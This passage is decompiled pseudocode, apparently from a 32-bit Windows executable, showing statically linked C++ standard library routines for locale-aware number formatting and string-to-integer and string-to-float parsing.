  struct std::_Facet_base *v18; // eax
  struct std::_Facet_base *v19; // esi
  void (__thiscall ***v20)(_DWORD, int); // eax
  int *v21; // edi
  char v22; // al
  _BYTE *v23; // esi
  int v24; // edx
  char *v25; // edi
  void **v26; // eax
  _BYTE *v27; // esi
  unsigned int v28; // esi
  unsigned int v29; // edx
  _DWORD *v30; // esi
  char *v31; // edi
  unsigned int v32; // edi
  int v33; // edi
  int v34; // eax
  int *v35; // eax
  int v36; // esi
  int v37; // edx
  _DWORD *v38; // ecx
  unsigned __int8 *v39; // eax
  int *v40; // eax
  unsigned __int8 *v41; // eax
  int *v42; // eax
  unsigned __int8 *v43; // eax
  int v44; // edx
  _DWORD *v45; // ecx
  void **v46; // eax
  int *v47; // eax
  void *v48; // ecx
  void *v49; // ecx
  int v51; // [esp-28h] [ebp-A8h]
  unsigned int v52; // [esp+14h] [ebp-6Ch]
  char *v53; // [esp+18h] [ebp-68h]
  int Size; // [esp+1Ch] [ebp-64h]
  char v55; // [esp+20h] [ebp-60h]
  int *v56; // [esp+28h] [ebp-58h]
  int v57; // [esp+2Ch] [ebp-54h] BYREF
  int v58; // [esp+30h] [ebp-50h]
  void *v59; // [esp+34h] [ebp-4Ch]
  int v60; // [esp+38h] [ebp-48h]
  char v61; // [esp+3Fh] [ebp-41h]
  int v62[5]; // [esp+40h] [ebp-40h] BYREF
  unsigned int v63; // [esp+54h] [ebp-2Ch]
  void *Src[4]; // [esp+58h] [ebp-28h] BYREF
  char *v65; // [esp+68h] [ebp-18h]
  unsigned int v66; // [esp+6Ch] [ebp-14h]
  int v67; // [esp+7Ch] [ebp-4h]
  int savedregs; // [esp+80h] [ebp+0h] BYREF
  _DWORD *v69; // [esp+94h] [ebp+14h]

  v8 = a8;
  v9 = a8 && (*a7 == 43 || *a7 == 45);
  v10 = *((_DWORD *)a5 + 5) & 0xE00;
  v60 = v9;
  if ( v10 == 2048 && v9 + 2 <= a8 && a7[v9] == 48 )
  {
    v11 = a7[v9 + 1];
    if ( v11 == 120 || v11 == 88 )
      v60 = v9 + 2;
  }
  v58 = *(_DWORD *)(*((_DWORD *)a5 + 12) + 4);
  v12 = v58;
  (*(void (__thiscall **)(int))(*(_DWORD *)v12 + 4))(v12);
  v67 = 0;
  v13 = sub_421800((int)&savedregs, (int)&v57);
  v67 = -1;
  v14 = v13;
  if ( v12 )
  {
    v15 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v12 + 8))(v12);
    if ( v15 )
      (**v15)(v15, 1);
  }
  sub_419B50((int)Src, a8, 0);
  v16 = Src;
  if ( v66 >= 0x10 )
    v16 = (void **)Src[0];
  v17 = *(_DWORD *)v14;
  v67 = 1;
  (*(void (__thiscall **)(char *, _BYTE *, _BYTE *, void **))(v17 + 28))(v14, a7, &a7[a8], v16);
  v58 = *(_DWORD *)(*((_DWORD *)a5 + 12) + 4);
  (*(void (**)(void))(*(_DWORD *)v58 + 4))();
  LOBYTE(v67) = 2;
  v18 = sub_42A3A0((int)&v57);
  LOBYTE(v67) = 1;
  v19 = v18;
  if ( v58 )
  {
    v20 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v58 + 8))(v58);
    if ( v20 )
      (**v20)(v20, 1);
  }
  (*(void (__thiscall **)(struct std::_Facet_base *, int *))(*(_DWORD *)v19 + 20))(v19, v62);
  v21 = v62;
  LOBYTE(v67) = 3;
  if ( v63 >= 0x10 )
    v21 = (int *)v62[0];
  v56 = v21;
  if ( *(_BYTE *)v21 == 127
    || *(char *)v21 <= 0
    || (v61 = (*(int (__thiscall **)(struct std::_Facet_base *))(*(_DWORD *)v19 + 16))(v19),
        v22 = *(_BYTE *)v21,
        *(_BYTE *)v21 == 127) )
  {
    v23 = Src[0];
LABEL_52:
    v24 = v60;
  }
  else
  {
    v23 = Src[0];
    while ( 1 )
    {
      v24 = v60;
      if ( v22 <= 0 || v22 >= v8 - v60 )
        break;
      v25 = v65;
      v8 -= v22;
      if ( (unsigned int)v65 < v8 )
        sub_421040();
      v52 = v66;
      if ( (char *)v66 == v65 )
      {
        if ( v65 == (char *)0x7FFFFFFF )
          sub_4257D0();
        v28 = (unsigned int)(v65 + 1) | 0xF;
        if ( v28 <= 0x7FFFFFFF )
        {
          v29 = v66 >> 1;
          if ( v66 <= 0x7FFFFFFF - (v66 >> 1) )
          {
            if ( v28 < v66 + v29 )
              v28 = v66 + v29;
          }
          else
          {
            v28 = 0x7FFFFFFF;
          }
        }
        else
        {
          v28 = 0x7FFFFFFF;
        }
        v59 = sub_41FC00(v28 + 1);
        v65 = v25 + 1;
        v66 = v28;
        v23 = v59;
        v55 = v61;
        Size = (int)&v25[-v8 + 1];
        v58 = (int)v59 + v8;
        v53 = (char *)v59 + v8 + 1;
        if ( v52 < 0x10 )
        {
          memmove(v59, Src, v8);
          v23[v8] = v55;
          memmove(v53, (char *)Src + v8, Size);
        }
        else
        {
          v30 = Src[0];
          memmove(v59, Src[0], v8);
          *(_BYTE *)v58 = v55;
          memmove(v53, (char *)v30 + v8, Size);
          if ( v52 + 1 >= 0x1000 )
          {
            if ( (unsigned int)v30 - *(v30 - 1) - 4 > 0x1F )
              goto LABEL_82;
            v30 = (_DWORD *)*(v30 - 1);
          }
          sub_46C87D(v30);
          v23 = v59;
        }
        Src[0] = v23;
      }
      else
      {
        ++v65;
        v26 = Src;
        if ( v66 >= 0x10 )
          v26 = (void **)v23;
        v27 = (char *)v26 + v8;
        memmove_0((char *)v26 + v8 + 1, (char *)v26 + v8, (size_t)&v25[-v8 + 1]);
        *v27 = v61;
        v23 = Src[0];
      }
      v31 = (char *)v56;
      if ( *((char *)v56 + 1) > 0 )
        v31 = (char *)v56 + 1;
      v56 = (int *)v31;
      v22 = *v31;
      if ( *v31 == 127 )
        goto LABEL_52;
    }
  }
  v59 = v65;
  v32 = *((_DWORD *)a5 + 8);
  if ( a5[4] <= 0 || v32 <= (unsigned int)v65 )
    v33 = 0;
  else
    v33 = v32 - (_DWORD)v65;
  v34 = *((_DWORD *)a5 + 5) & 0x1C0;
  if ( v34 == 64 )
  {
    v43 = (unsigned __int8 *)Src;
    if ( v66 >= 0x10 )
      v43 = v23;
    v40 = sub_42DD60(a1, &v57, a3, a4, v43, v24);
    goto LABEL_68;
  }
  if ( v34 == 256 )
  {
    v41 = (unsigned __int8 *)Src;
    if ( v66 >= 0x10 )
      v41 = v23;
    v42 = sub_42DD60(a1, &v57, a3, a4, v41, v24);
    v40 = sub_42DDE0(a1, &v57, *v42, (_DWORD *)v42[1], a6, v33);
    v33 = 0;
LABEL_68:
    v36 = v60;
    goto LABEL_69;
  }
  v35 = sub_42DDE0(a1, &v57, a3, a4, a6, v33);
  v36 = v60;
  v33 = 0;
  v37 = *v35;
  v38 = (_DWORD *)v35[1];
  v39 = (unsigned __int8 *)Src;
  if ( v66 >= 0x10 )
    v39 = (unsigned __int8 *)Src[0];
  v40 = sub_42DD60(a1, &v57, v37, v38, v39, v60);
LABEL_69:
  v44 = *v40;
  v45 = (_DWORD *)v40[1];
  v46 = Src;
  if ( v66 >= 0x10 )
    v46 = (void **)Src[0];
  v59 = (char *)v59 - v36;
  v47 = sub_42DD60(a1, &v57, v44, v45, (unsigned __int8 *)v46 + v36, (int)v59);
  v51 = *v47;
  v69 = (_DWORD *)v47[1];
  *((_DWORD *)a5 + 8) = 0;
  *((_DWORD *)a5 + 9) = 0;
  sub_42DDE0(a1, a2, v51, v69, a6, v33);
  if ( v63 >= 0x10 )
  {
    v48 = (void *)v62[0];
    if ( v63 + 1 >= 0x1000 )
    {
      v48 = *(void **)(v62[0] - 4);
      if ( (unsigned int)(v62[0] - (_DWORD)v48 - 4) > 0x1F )
        goto LABEL_82;
    }
    sub_46C87D(v48);
  }
  v62[4] = 0;
  v63 = 15;
  LOBYTE(v62[0]) = 0;
  if ( v66 >= 0x10 )
  {
    v49 = Src[0];
    if ( v66 + 1 < 0x1000 || (v49 = (void *)*((_DWORD *)Src[0] - 1), (unsigned int)(Src[0] - v49 - 4) <= 0x1F) )
    {
      sub_46C87D(v49);
      return a2;
    }
LABEL_82:
    _invalid_parameter_noinfo_noreturn();
  }
  return a2;
}
// 421040: using guessed type void __noreturn sub_421040(void);
// 4257D0: using guessed type void __noreturn sub_4257D0(void);

//----- (0042DD60) --------------------------------------------------------
_DWORD *__cdecl sub_42DD60(int a1, _DWORD *a2, int a3, _DWORD *a4, unsigned __int8 *a5, int a6)
{
  _DWORD *v6; // esi
  int i; // edi
  int *v9; // edx
  _DWORD *v10; // ecx
  unsigned __int8 *v11; // edx
  int v12; // eax
  _DWORD *result; // eax
  unsigned __int8 v14; // [esp+27h] [ebp+1Fh]

  v6 = a4;
  for ( i = a6; i; --i )
  {
    if ( !v6 )
      goto LABEL_8;
    v14 = *a5;
    if ( *(_DWORD *)v6[8] && (v9 = (int *)v6[12], *v9 > 0) )
    {
      --*v9;
      v10 = (_DWORD *)v6[8];
      v11 = (unsigned __int8 *)(*v10)++;
      *v11 = v14;
      v12 = v14;
    }
    else
    {
      v12 = (*(int (__thiscall **)(_DWORD *, _DWORD))(*v6 + 12))(v6, *a5);
    }
    v6 = a4;
    if ( v12 == -1 )
LABEL_8:
      LOBYTE(a3) = 1;
    ++a5;
  }
  result = a2;
  a2[1] = v6;
  *a2 = a3;
  return result;
}

//----- (0042DDE0) --------------------------------------------------------
_DWORD *__cdecl sub_42DDE0(int a1, _DWORD *a2, int a3, _DWORD *a4, unsigned __int8 a5, int a6)
{
  _DWORD *v6; // esi
  int i; // edi
  int *v8; // ecx
  _DWORD *v9; // ecx
  unsigned __int8 *v10; // edx
  int v11; // eax
  _DWORD *result; // eax

  v6 = a4;
  for ( i = a6; i; --i )
  {
    if ( v6 )
    {
      if ( *(_DWORD *)v6[8] && (v8 = (int *)v6[12], *v8 > 0) )
      {
        --*v8;
        v9 = (_DWORD *)v6[8];
        v10 = (unsigned __int8 *)(*v9)++;
        *v10 = a5;
        v11 = a5;
      }
      else
      {
        v11 = (*(int (__thiscall **)(_DWORD *, _DWORD))(*v6 + 12))(v6, a5);
      }
      v6 = a4;
      if ( v11 != -1 )
        continue;
    }
    LOBYTE(a3) = 1;
  }
  result = a2;
  a2[1] = v6;
  *a2 = a3;
  return result;
}

//----- (0042DE50) --------------------------------------------------------
int __thiscall sub_42DE50(_DWORD *this, int a2)
{
  void *v2; // edx

  v2 = (void *)this[4];
  *(_DWORD *)(a2 + 16) = 0;
  *(_DWORD *)(a2 + 20) = 15;
  *(_BYTE *)a2 = 0;
  sub_41EF80((void **)a2, v2, strlen((const char *)v2));
  return a2;
}

//----- (0042DE90) --------------------------------------------------------
_DWORD *__thiscall sub_42DE90(void *this, _DWORD *a2, int a3, int a4, char a5, int a6, int a7, _DWORD *a8, _WORD *a9)
{
  int v10; // esi
  _DWORD *v11; // ebx
  int v12; // eax
  size_t v13; // edi
  void (__thiscall ***v14)(_DWORD, int); // eax
  _WORD *v15; // eax
  char *v16; // esi
  unsigned int v17; // eax
  _WORD *v18; // ecx
  int v19; // eax
  _DWORD *result; // eax
  char *v21; // [esp+14h] [ebp-44h] BYREF
  char v22[4]; // [esp+18h] [ebp-40h] BYREF
  int v23; // [esp+1Ch] [ebp-3Ch] BYREF
  _WORD *v24; // [esp+20h] [ebp-38h]
  bool v25; // [esp+27h] [ebp-31h]
  char v26; // [esp+28h] [ebp-30h] BYREF
  char v27; // [esp+29h] [ebp-2Fh] BYREF
  int v28; // [esp+54h] [ebp-4h]

  v10 = a7;
  v11 = a8;
  v24 = a9;
  v23 = *(_DWORD *)(*(_DWORD *)(a7 + 48) + 4);
  (*(void (**)(void))(*(_DWORD *)v23 + 4))();
  v28 = 0;
  v12 = sub_42D2C0((int)this, &v26, &a3, (int)&a5, *(_DWORD *)(v10 + 20), (int)v22);
  v28 = -1;
  v13 = v12;
  if ( v23 )
  {
    v14 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v23 + 8))(v23);
    if ( v14 )
      (**v14)(v14, 1);
  }
  if ( !v26 )
  {
    v15 = v24;
    *v11 = 2;
    *v15 = 0;
    goto LABEL_15;
  }
  v25 = v26 == 45;
  v16 = &v27;
  if ( v26 != 45 )
    v16 = &v26;
  v17 = _Stoulx(v16, &v21, v13, &v23);
  v18 = v24;
  *v24 = v17;
  if ( v21 == v16 || v23 || v17 > 0xFFFF )
  {
    *v11 = 2;
    LOWORD(v19) = -1;
  }
  else
  {
    if ( !v25 )
      goto LABEL_15;
    v19 = -(unsigned __int16)v17;
  }
  *v18 = v19;
LABEL_15:
  if ( sub_429020((int)&a3, (int)&a5) )
    *v11 |= 1u;
  result = a2;
  *a2 = a3;
  a2[1] = a4;
  return result;
}
// 46AFE9: using guessed type _DWORD __cdecl _Stoulx(_DWORD, _DWORD, size_t MaxCount, _DWORD);
// 42DE90: using guessed type char var_40[4];

//----- (0042DFE0) --------------------------------------------------------
int *__thiscall sub_42DFE0(void *this, int *a2, int a3, int a4, int a5, int a6, int a7, _DWORD *a8, _DWORD *a9)
{
  int v10; // eax
  size_t v11; // esi
  void (__thiscall ***v12)(_DWORD, int); // eax
  int v13; // esi
  int v14; // ecx
  int *result; // eax
  int v16[2]; // [esp+10h] [ebp-54h] BYREF
  int *v17; // [esp+18h] [ebp-4Ch]
  _DWORD *v18; // [esp+1Ch] [ebp-48h]
  char *v19; // [esp+20h] [ebp-44h] BYREF
  char v20[4]; // [esp+24h] [ebp-40h] BYREF
  int v21; // [esp+28h] [ebp-3Ch] BYREF
  int v22; // [esp+2Ch] [ebp-38h] BYREF
  int v23; // [esp+30h] [ebp-34h]
  char v24[32]; // [esp+34h] [ebp-30h] BYREF
  int v25; // [esp+60h] [ebp-4h]

  v17 = a2;
  v18 = a9;
  v16[0] = a5;
  v16[1] = a6;
  v22 = a3;
  v23 = a4;
  v21 = *(_DWORD *)(*(_DWORD *)(a7 + 48) + 4);
  (*(void (**)(void))(*(_DWORD *)v21 + 4))();
  v25 = 0;
  v10 = sub_42D2C0((int)this, v24, &v22, (int)v16, *(_DWORD *)(a7 + 20), (int)v20);
  v25 = -1;
  v11 = v10;
  if ( v21 )
  {
    v12 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v21 + 8))(v21);
    if ( v12 )
      (**v12)(v12, 1);
  }
  if ( !v24[0] )
  {
    v13 = 0;
LABEL_8:
    *a8 = 2;
    goto LABEL_9;
  }
  v13 = _Stoulx(v24, &v19, v11, &v21);
  if ( v19 == v24 || v21 )
    goto LABEL_8;
LABEL_9:
  if ( sub_429020((int)&v22, (int)v16) )
    *a8 |= 1u;
  v14 = v22;
  *v18 = v13;
  result = v17;
  *v17 = v14;
  result[1] = v23;
  return result;
}
// 46AFE9: using guessed type _DWORD __cdecl _Stoulx(_DWORD, _DWORD, size_t MaxCount, _DWORD);
// 42DFE0: using guessed type char var_40[4];

//----- (0042E110) --------------------------------------------------------
_DWORD *__thiscall sub_42E110(void *this, _DWORD *a2, int a3, int a4, char a5, int a6, int a7, _DWORD *a8, _DWORD *a9)
{
  int v10; // esi
  _DWORD *v11; // ebx
  int v12; // eax
  int v13; // esi
  void (__thiscall ***v14)(_DWORD, int); // eax
  _DWORD *v15; // ecx
  int v16; // eax
  _DWORD *result; // eax
  char *v18; // [esp+14h] [ebp-40h] BYREF
  char v19[4]; // [esp+18h] [ebp-3Ch] BYREF
  int v20; // [esp+1Ch] [ebp-38h] BYREF
  _DWORD *v21; // [esp+20h] [ebp-34h]
  char v22[32]; // [esp+24h] [ebp-30h] BYREF
  int v23; // [esp+50h] [ebp-4h]

  v10 = a7;
  v11 = a8;
  v21 = a9;
  v20 = *(_DWORD *)(*(_DWORD *)(a7 + 48) + 4);
  (*(void (**)(void))(*(_DWORD *)v20 + 4))();
  v23 = 0;
  v12 = sub_42D2C0((int)this, v22, &a3, (int)&a5, *(_DWORD *)(v10 + 20), (int)v19);
  v23 = -1;
  v13 = v12;
  if ( v20 )
  {
    v14 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v20 + 8))(v20);
    if ( v14 )
      (**v14)(v14, 1);
  }
  if ( v22[0] )
  {
    v16 = _Stolx(v22, &v18, v13, &v20);
    *v21 = v16;
    if ( v18 == v22 || v20 )
      *v11 = 2;
  }
  else
  {
    v15 = v21;
    *v11 = 2;
    *v15 = 0;
  }
  if ( sub_429020((int)&a3, (int)&a5) )
    *v11 |= 1u;
  result = a2;
  *a2 = a3;
  a2[1] = a4;
  return result;
}
// 46AF44: using guessed type _DWORD __cdecl _Stolx(_DWORD, _DWORD, _DWORD, _DWORD);
// 42E110: using guessed type char var_3C[4];

//----- (0042E230) --------------------------------------------------------
_DWORD *__thiscall sub_42E230(void *this, _DWORD *a2, int a3, int a4, char a5, int a6, int a7, _DWORD *a8, _DWORD *a9)
{
  int v10; // esi
  _DWORD *v11; // ebx
  int v12; // eax
  size_t v13; // esi
  void (__thiscall ***v14)(_DWORD, int); // eax
  _DWORD *v15; // ecx
  int v16; // eax
  _DWORD *result; // eax
  char *v18; // [esp+14h] [ebp-40h] BYREF
  char v19[4]; // [esp+18h] [ebp-3Ch] BYREF
  int v20; // [esp+1Ch] [ebp-38h] BYREF
  _DWORD *v21; // [esp+20h] [ebp-34h]
  char v22[32]; // [esp+24h] [ebp-30h] BYREF
  int v23; // [esp+50h] [ebp-4h]

  v10 = a7;
  v11 = a8;
  v21 = a9;
  v20 = *(_DWORD *)(*(_DWORD *)(a7 + 48) + 4);
  (*(void (**)(void))(*(_DWORD *)v20 + 4))();
  v23 = 0;
  v12 = sub_42D2C0((int)this, v22, &a3, (int)&a5, *(_DWORD *)(v10 + 20), (int)v19);
  v23 = -1;
  v13 = v12;
  if ( v20 )
  {
    v14 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v20 + 8))(v20);
    if ( v14 )
      (**v14)(v14, 1);
  }
  if ( v22[0] )
  {
    v16 = _Stoulx(v22, &v18, v13, &v20);
    *v21 = v16;
    if ( v18 == v22 || v20 )
      *v11 = 2;
  }
  else
  {
    v15 = v21;
    *v11 = 2;
    *v15 = 0;
  }
  if ( sub_429020((int)&a3, (int)&a5) )
    *v11 |= 1u;
  result = a2;
  *a2 = a3;
  a2[1] = a4;
  return result;
}
// 46AFE9: using guessed type _DWORD __cdecl _Stoulx(_DWORD, _DWORD, size_t MaxCount, _DWORD);
// 42E230: using guessed type char var_3C[4];

//----- (0042E350) --------------------------------------------------------
_DWORD *__userpurge sub_42E350@<eax>(
        int a1@<ecx>,
        double a2@<st0>,
        _DWORD *a3,
        int a4,
        int a5,
        char a6,
        int a7,
        int a8,
        _DWORD *a9,
        float *a10)
{
  _DWORD *v10; // ebx
  int *v11; // edi
  int v12; // esi
  int v13; // ecx
  int v14; // eax
  double v15; // xmm0_8
  float v16; // xmm0_4
  float *v17; // esi
  _DWORD *result; // eax
  char *v19; // [esp+18h] [ebp-334h] BYREF
  int v20; // [esp+1Ch] [ebp-330h]
  int v21; // [esp+20h] [ebp-32Ch]
  float *v22; // [esp+24h] [ebp-328h]
  int v23; // [esp+28h] [ebp-324h] BYREF
  float v24; // [esp+2Ch] [ebp-320h]
  char v25[792]; // [esp+30h] [ebp-31Ch] BYREF

  v10 = a9;
  v22 = a10;
  v23 = 1000000000;
  v21 = sub_42B950(a1, v25, &a4, (int)&a6, a8, &v23);
  if ( !v25[0] )
  {
    v17 = v22;
LABEL_11:
    *v10 = 2;
    *v17 = 0.0;
    goto LABEL_12;
  }
  v11 = _errno();
  v12 = *v11;
  *v11 = 0;
  sub_493D9D((int)v25, &v19);
  v13 = *v11;
  v14 = v21;
  *v11 = v12;
  v20 = v13;
  v24 = a2;
  if ( v14 )
  {
    v15 = *(double *)_libm_sse2_pow_precise().m128_u64;
    v13 = v20;
    *(float *)&v15 = v15;
    v16 = *(float *)&v15 * v24;
  }
  else
  {
    v16 = v24;
  }
  v17 = v22;
  *v22 = v16;
  if ( v19 == v25 || v13 )
    goto LABEL_11;
  if ( v23 != 1000000000 && v23 )
    *v17 = ldexp(v16, 4 * v23);
LABEL_12:
  if ( sub_429020((int)&a4, (int)&a6) )
    *v10 |= 1u;
  result = a3;
  *a3 = a4;
  a3[1] = a5;
  return result;
}
// 494100: using guessed type __m128 _libm_sse2_pow_precise(void);

//----- (0042E4D0) --------------------------------------------------------
_DWORD *__userpurge sub_42E4D0@<eax>(
        int a1@<ecx>,
        double a2@<st0>,
        _DWORD *a3,
        int a4,
        int a5,
        char a6,
        int a7,
        int a8,
        _DWORD *a9,
        double *a10)
{
  _DWORD *v10; // ebx
  int *v11; // edi
  int v12; // esi
  int v13; // ecx
  int v14; // eax
  double X; // xmm0_8
  double *v16; // esi
  _DWORD *result; // eax
  char *v18; // [esp+20h] [ebp-330h] BYREF
  int v19; // [esp+24h] [ebp-32Ch]
  int v20; // [esp+28h] [ebp-328h]
  double *v21; // [esp+2Ch] [ebp-324h]
  int v22; // [esp+30h] [ebp-320h] BYREF
  char v23[792]; // [esp+34h] [ebp-31Ch] BYREF

  v10 = a9;
  v21 = a10;
  v22 = 1000000000;
  v20 = sub_42B950(a1, v23, &a4, (int)&a6, a8, &v22);
  if ( !v23[0] )
  {
    v16 = v21;
LABEL_11:
    *v10 = 2;
    *v16 = 0.0;
    goto LABEL_12;
  }
  v11 = _errno();
  v12 = *v11;
  *v11 = 0;
  sub_493D86((int)v23, &v18);
  v13 = *v11;
  v14 = v20;
  *v11 = v12;
  v19 = v13;
  if ( v14 )
  {
    X = *(double *)_libm_sse2_pow_precise().m128_u64 * a2;
    v13 = v19;
  }
  else
  {
    X = a2;
  }
  v16 = v21;
  *v21 = X;
  if ( v18 == v23 || v13 )
    goto LABEL_11;
  if ( v22 != 1000000000 && v22 )
    *v16 = ldexp(X, 4 * v22);
LABEL_12:
  if ( sub_429020((int)&a4, (int)&a6) )
    *v10 |= 1u;
  result = a3;
  *a3 = a4;
  a3[1] = a5;
  return result;
}
// 494100: using guessed type __m128 _libm_sse2_pow_precise(void);

//----- (0042E640) --------------------------------------------------------
int *__userpurge sub_42E640@<eax>(
        int a1@<ecx>,
        double a2@<st0>,
        int a3,
        int a4,
        int a5,
        int a6,
        int a7,
        int a8,
        _DWORD *a9,
        int a10)
{
  int *v10; // esi
  double *v11; // edi
  int *v12; // edi
  int v13; // esi
  int v14; // ecx
  int v15; // eax
  double X; // xmm0_8
  double v17; // xmm0_8
  int *result; // eax
  int v19; // ecx
  int v20[2]; // [esp+18h] [ebp-350h] BYREF
  char *v21; // [esp+20h] [ebp-348h] BYREF
  int v22; // [esp+24h] [ebp-344h]
  double v23; // [esp+28h] [ebp-340h]
  int v24; // [esp+30h] [ebp-338h] BYREF
  int v25; // [esp+34h] [ebp-334h]
  int v26; // [esp+38h] [ebp-330h] BYREF
  double v27; // [esp+3Ch] [ebp-32Ch]
  double *v28; // [esp+44h] [ebp-324h]
  int *v29; // [esp+48h] [ebp-320h]
  char v30[792]; // [esp+4Ch] [ebp-31Ch] BYREF

  v20[0] = a6;
  v20[1] = a7;
  v10 = (int *)a3;
  v24 = a4;
  v11 = (double *)a10;
  v25 = a5;
  v29 = (int *)a3;
  v28 = (double *)a10;
  v26 = 1000000000;
  HIDWORD(v27) = sub_42B950(a1, v30, &v24, (int)v20, a8, &v26);
  if ( !v30[0] )
  {
    *a9 = 2;
    v27 = 0.0;
    goto LABEL_14;
  }
  v12 = _errno();
  v13 = *v12;
  *v12 = 0;
  sub_493D86((int)v30, &v21);
  v14 = *v12;
  v15 = HIDWORD(v27);
  v22 = *v12;
  *v12 = v13;
  v23 = a2;
  if ( v15 )
  {
    X = *(double *)_libm_sse2_pow_precise().m128_u64 * v23;
    v14 = v22;
  }
  else
  {
    X = v23;
  }
  v27 = X;
  if ( v21 == v30 || v14 )
  {
    *a9 = 2;
    v17 = 0.0;
  }
  else
  {
    if ( v26 == 1000000000 || !v26 )
      goto LABEL_13;
    v23 = ldexp(X, 4 * v26);
    v17 = v23;
  }
  v27 = v17;
LABEL_13:
  v11 = v28;
  v10 = v29;
LABEL_14:
  if ( sub_429020((int)&v24, (int)v20) )
    *a9 |= 1u;
  result = v10;
  v19 = v24;
  *v11 = v27;
  *v10 = v19;
  v10[1] = v25;
  return result;
}
// 494100: using guessed type __m128 _libm_sse2_pow_precise(void);

//----- (0042E810) --------------------------------------------------------
_DWORD *__thiscall sub_42E810(void *this, _DWORD *a2, int a3, int a4, char a5, int a6, int a7, _DWORD *a8, _DWORD *a9)
{
  _DWORD *v10; // edi
  int v11; // eax
  size_t v12; // esi
  void (__thiscall ***v13)(_DWORD, int); // eax
  int v14; // eax
  _DWORD *v15; // ecx
  _DWORD *result; // eax
  char *v17; // [esp+10h] [ebp-40h] BYREF
  char v18[4]; // [esp+14h] [ebp-3Ch] BYREF
  int v19; // [esp+18h] [ebp-38h] BYREF
  _DWORD *v20; // [esp+1Ch] [ebp-34h]
  char v21[32]; // [esp+20h] [ebp-30h] BYREF
  int v22; // [esp+4Ch] [ebp-4h]

  v10 = a8;
  v20 = a9;
  v19 = *(_DWORD *)(*(_DWORD *)(a7 + 48) + 4);
  (*(void (**)(void))(*(_DWORD *)v19 + 4))();
  v22 = 0;
  v11 = sub_42D2C0((int)this, v21, &a3, (int)&a5, 2048, (int)v18);
  v22 = -1;
  v12 = v11;
  if ( v19 )
  {
    v13 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v19 + 8))(v19);
    if ( v13 )
      (**v13)(v13, 1);
  }
  if ( !v21[0] )
  {
    v15 = v20;
LABEL_9:
    *v10 = 2;
    *v15 = 0;
    goto LABEL_10;
  }
  v14 = _Stoulx(v21, &v17, v12, &v19);
  v15 = v20;
  *v20 = v14;
  if ( v17 == v21 || v19 )
    goto LABEL_9;
LABEL_10:
  if ( sub_429020((int)&a3, (int)&a5) )
    *v10 |= 1u;
  result = a2;
  *a2 = a3;
  a2[1] = a4;
  return result;
}
// 46AFE9: using guessed type _DWORD __cdecl _Stoulx(_DWORD, _DWORD, size_t MaxCount, _DWORD);
// 42E810: using guessed type char var_3C[4];

//----- (0042E930) --------------------------------------------------------
_DWORD *__thiscall sub_42E930(void *this, _DWORD *a2, int a3, int a4, char a5, int a6, int a7, _DWORD *a8, __int64 *a9)
{
  int v10; // esi
  _DWORD *v11; // ebx
  int v12; // eax
  int v13; // esi
  void (__thiscall ***v14)(_DWORD, int); // eax
  __int64 *v15; // eax
  __int64 v16; // rax
  _DWORD *result; // eax
  char *v18; // [esp+14h] [ebp-40h] BYREF
  char v19[4]; // [esp+18h] [ebp-3Ch] BYREF
  int v20; // [esp+1Ch] [ebp-38h] BYREF
  __int64 *v21; // [esp+20h] [ebp-34h]
  char v22[32]; // [esp+24h] [ebp-30h] BYREF
  int v23; // [esp+50h] [ebp-4h]

  v10 = a7;
  v11 = a8;
  v21 = a9;
  v20 = *(_DWORD *)(*(_DWORD *)(a7 + 48) + 4);
  (*(void (**)(void))(*(_DWORD *)v20 + 4))();
  v23 = 0;
  v12 = sub_42D2C0((int)this, v22, &a3, (int)&a5, *(_DWORD *)(v10 + 20), (int)v19);
  v23 = -1;
  v13 = v12;
  if ( v20 )
  {
    v14 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v20 + 8))(v20);
    if ( v14 )
      (**v14)(v14, 1);
  }
  if ( v22[0] )
  {
    v16 = _Stollx(v22, &v18, v13, &v20);
    *v21 = v16;
    if ( v18 == v22 || v20 )
      *v11 = 2;
  }
  else
  {
    v15 = v21;
    *v11 = 2;
    *(_DWORD *)v15 = 0;
    *((_DWORD *)v15 + 1) = 0;
  }
  if ( sub_429020((int)&a3, (int)&a5) )
    *v11 |= 1u;
  result = a2;
  *a2 = a3;
  a2[1] = a4;
  return result;
}
// 46B15C: using guessed type __int64 __cdecl _Stollx(_DWORD, _DWORD, _DWORD, _DWORD);
// 42E930: using guessed type char var_3C[4];

//----- (0042EA60) --------------------------------------------------------
_DWORD *__thiscall sub_42EA60(void *this, _DWORD *a2, int a3, int a4, char a5, int a6, int a7, _DWORD *a8, __int64 *a9)
{
  int v10; // esi
  _DWORD *v11; // ebx
  int v12; // eax
  size_t v13; // esi
  void (__thiscall ***v14)(_DWORD, int); // eax
  __int64 *v15; // eax
  __int64 v16; // rax
  _DWORD *result; // eax
  char *v18; // [esp+14h] [ebp-40h] BYREF
  char v19[4]; // [esp+18h] [ebp-3Ch] BYREF
  int v20; // [esp+1Ch] [ebp-38h] BYREF
  __int64 *v21; // [esp+20h] [ebp-34h]
  char v22[32]; // [esp+24h] [ebp-30h] BYREF
  int v23; // [esp+50h] [ebp-4h]

  v10 = a7;
  v11 = a8;
  v21 = a9;
  v20 = *(_DWORD *)(*(_DWORD *)(a7 + 48) + 4);
  (*(void (**)(void))(*(_DWORD *)v20 + 4))();
  v23 = 0;
  v12 = sub_42D2C0((int)this, v22, &a3, (int)&a5, *(_DWORD *)(v10 + 20), (int)v19);
  v23 = -1;
  v13 = v12;
  if ( v20 )
  {
    v14 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v20 + 8))(v20);
    if ( v14 )
      (**v14)(v14, 1);
  }
  if ( v22[0] )
  {
    v16 = _Stoullx(v22, &v18, v13, &v20);
    *v21 = v16;
    if ( v18 == v22 || v20 )
      *v11 = 2;
  }
  else
  {
    v15 = v21;
    *v11 = 2;
    *(_DWORD *)v15 = 0;
    *((_DWORD *)v15 + 1) = 0;
  }
  if ( sub_429020((int)&a3, (int)&a5) )
    *v11 |= 1u;
